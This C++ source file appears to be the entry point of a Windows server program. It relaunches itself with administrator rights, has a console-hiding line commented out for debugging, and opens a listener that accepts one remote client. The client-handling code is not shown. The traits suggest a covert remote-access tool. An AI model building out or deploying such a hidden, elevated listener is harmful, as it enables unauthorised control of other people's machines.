#include <iostream>
#include <string>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <minwindef.h>
#include <ws2def.h>
#include <ws2ipdef.h>
#include <minwinbase.h>
#include <exception>
#include <iosfwd>

#include "const.h"
#include "syscalls.h"
#include "socket.h"

// Request

static void startServer()
{
	WSADATA wsaData;
	SOCKET ListenSocket = INVALID_SOCKET, ClientSocket = INVALID_SOCKET;
	struct addrinfo* result = NULL;

	// Initialize Winsock
	if (!initializeWinsock(wsaData)) return;

	// Resolve server address and bind socket
	if (!setupSocket(ListenSocket, result)) return;

	// Print listening info
	printListeningInfo(ListenSocket);

	// Accept a client connection
	ClientSocket = acceptClient(ListenSocket);
	if (ClientSocket == INVALID_SOCKET) return;

	// Close the listening socket as it's no longer needed
	closesocket(ListenSocket);

	// Handle client communication
	handleClient(ClientSocket);

	// Cleanup resources
	cleanup(ClientSocket);
}

int main()
{
	// Hide console window
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	//// Comment to debug
	if (!isElevated()) {
		// Request for elevation
		restartAsAdmin();
		return 0;
	}

	std::cout << "Server started." << std::endl;
	try {
		startServer();
	}
	catch (std::exception& e) {
		std::cerr << "An error occurred: " << e.what() << std::endl;
		return 1;
	}
	return 0;
}